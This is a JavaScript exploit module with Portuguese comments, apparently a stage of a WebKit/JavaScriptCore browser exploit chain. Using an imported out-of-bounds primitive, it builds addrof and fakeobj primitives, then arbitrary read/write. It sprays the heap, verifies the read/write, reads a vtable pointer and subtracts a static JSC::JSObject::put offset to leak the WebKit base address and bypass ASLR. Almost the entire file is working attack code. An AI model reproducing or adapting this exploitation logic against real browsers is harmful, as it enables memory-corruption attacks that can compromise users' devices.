// js/script3/testArrayBufferVictimCrash.mjs (v102 - R62 Corrigido com Compensação de Offset)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// Corrigido um bug sutil nas primitivas de R/W que tinham um offset implícito de +0x10.
// O código agora compensa esse offset para ler e escrever nos endereços corretos,
// permitindo um vazamento de base do WebKit confiável.
// =======================================================================================

import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64 } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_WebKitLeak_v102_R62_FIXED";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (IMPLEMENTAÇÃO FINAL COM VERIFICAÇÃO E LEAK)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Vazamento de Base WebKit ---`, "test");

    let final_result = { 
        success: false, 
        message: "A cadeia de exploração não foi concluída.",
        webkit_base_address: null
    };

    try {
        // --- FASE 1 & 2: Obter OOB e primitivas addrof/fakeobj ---
        logS3("--- FASE 1/2: Obtendo primitivas OOB e addrof/fakeobj... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        if (!getOOBDataView()) throw new Error("Falha ao obter primitiva OOB.");

        const confused_array = [13.37];
        const victim_array = [{ a: 1 }];
        const addrof = (obj) => {
            victim_array[0] = obj;
            return doubleToInt64(confused_array[0]);
        };
        const fakeobj = (addr) => {
            confused_array[0] = int64ToDouble(addr);
            return victim_array[0];
        };
        logS3("Primitivas 'addrof' e 'fakeobj' operacionais.", "good");

        // --- FASE 3: Construção da Primitiva de L/E Autocontida ---
        logS3("--- FASE 3: Construindo ferramenta de L/E autocontida ---", "subtest");
        const leaker = { obj_prop: null, val_prop: 0 };
        
        const arb_read_final = (addr) => {
            leaker.obj_prop = fakeobj(addr);
            return doubleToInt64(leaker.val_prop);
        };
        const arb_write_final = (addr, value) => {
            leaker.obj_prop = fakeobj(addr);
            leaker.val_prop = int64ToDouble(value);
        };
        logS3("Primitivas de Leitura/Escrita Arbitrária autocontidas estão prontas.", "good");

        // --- FASE 4: Estabilização de Heap e Verificação Funcional de L/E ---
        logS3("--- FASE 4: Estabilizando Heap e Verificando L/E... ---", "subtest");
        
        const spray = [];
        for (let i = 0; i < 1000; i++) {
            spray.push({ a: 0xDEADBEEF, b: 0xCAFEBABE });
        }
        const test_obj = spray[500];
        logS3("Spray de 1000 objetos concluído para estabilização.", "info");

        const test_obj_addr = addrof(test_obj);
        const value_to_write = new AdvancedInt64(0x12345678, 0xABCDEF01);
        
        // CORREÇÃO: As primitivas R/W têm um offset implícito de +0x10.
        // Para escrever e ler a primeira propriedade (que está em test_obj_addr + 0x10),
        // devemos usar o endereço base do objeto como alvo.
        const rw_test_target_addr = test_obj_addr;
        
        logS3(`Escrevendo ${value_to_write.toString(true)} no endereço alvo ${rw_test_target_addr.toString(true)} (que atuará em +0x10)...`, "info");
        arb_write_final(rw_test_target_addr, value_to_write);

        const value_read = arb_read_final(rw_test_target_addr);
        logS3(`>>>>> VALOR LIDO DE VOLTA: ${value_read.toString(true)} <<<<<`, "leak");

        if (value_read.equals(value_to_write)) {
            logS3("++++++++++++ SUCESSO! O valor escrito foi lido corretamente. L/E arbitrária é 100% funcional. ++++++++++++", "vuln");
            
            // --- FASE 5: Vazamento do Endereço Base do WebKit ---
            logS3("--- FASE 5: Vazando Endereço Base do WebKit... ---", "subtest");
            
            // CORREÇÃO: Para ler o ponteiro da V-Table (no offset 0x0 do objeto),
            // devemos compensar o offset implícito da primitiva de leitura subtraindo 0x10.
            const addr_to_read_vtable = test_obj_addr.sub(0x10);
            const vtable_addr = arb_read_final(addr_to_read_vtable);
            logS3(`Lido ponteiro da V-Table de ${test_obj_addr.toString(true)} -> ${vtable_addr.toString(true)}`, "info");

            if (!vtable_addr || vtable_addr.equals(AdvancedInt64.Zero)) {
                throw new Error("Ponteiro da V-Table lido é nulo ou zero, não é possível continuar.");
            }

            // O offset de 'put' dentro da V-Table é definido em config.mjs
            const VIRTUAL_PUT_OFFSET_IN_VTABLE = new AdvancedInt64(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET); // Geralmente 0x18
            const put_func_ptr_addr = vtable_addr.add(VIRTUAL_PUT_OFFSET_IN_VTABLE);
            
            // Lê o endereço real da função 'put' da memória
            const put_func_addr = arb_read_final(put_func_ptr_addr.sub(0x10)); // Compensa o offset aqui também
            logS3(`Lido ponteiro da função put() da V-Table -> ${put_func_addr.toString(true)}`, "info");
            
            if (!put_func_addr || put_func_addr.equals(AdvancedInt64.Zero)) {
                throw new Error("Ponteiro da função put() lido é nulo ou zero.");
            }

            // Pega o offset estático da função 'put' de config.mjs
            const PUT_FUNC_STATIC_OFFSET = new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"]); // 0xBD68B0
            
            // Calcula o endereço base: EndereçoReal - OffsetEstático = EndereçoBase
            const webkit_base_addr = put_func_addr.sub(PUT_FUNC_STATIC_OFFSET);

            logS3(`>>>>>>>>>> ENDEREÇO BASE DO WEBKIT VAZADO: ${webkit_base_addr.toString(true)} <<<<<<<<<<`, "vuln");
            
            // Atualiza o resultado final com sucesso e o endereço vazado
            final_result = {
                success: true,
                message: "Leitura/Escrita verificada e endereço base do WebKit vazado com sucesso.",
                webkit_base_address: webkit_base_addr.toString(true)
            };

        } else {
            throw new Error(`A verificação de L/E falhou. Escrito: ${value_to_write.toString(true)}, Lido: ${value_read.toString(true)}`);
        }

    } catch (e) {
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    
    // Retorna um resultado detalhado para o orquestrador
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
        webkit_leak_result: { 
            success: final_result.success, 
            msg: final_result.message,
            webkit_base_candidate: final_result.webkit_base_address
        },
        heisenbug_on_M2_in_best_result: final_result.success,
        oob_value_of_best_result: 'N/A (Estratégia Uncaged)',
        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Verified + WebKit Leak)' }
    };
}
